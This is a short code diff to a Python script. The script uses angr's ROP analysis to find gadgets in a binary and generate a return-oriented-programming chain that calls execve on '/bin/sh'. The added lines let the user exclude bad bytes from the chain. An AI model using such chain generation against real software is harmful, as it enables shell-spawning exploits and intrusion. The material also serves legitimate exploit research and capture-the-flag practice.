@@ -9,6 +9,10 @@ ropchain_path = sys.argv[2]
 
 project = Project(binary)
 rop = project.analyses.ROP()
+if len(sys.argv) == 4:
+    import binascii
+    bad_chars = sys.argv[3]
+    rop.set_badbytes(list(binascii.unhexlify(bad_chars)))
 rop.find_gadgets_single_threaded(show_progress=False)
 chain = rop.execve(b"/bin/sh\x00")
 
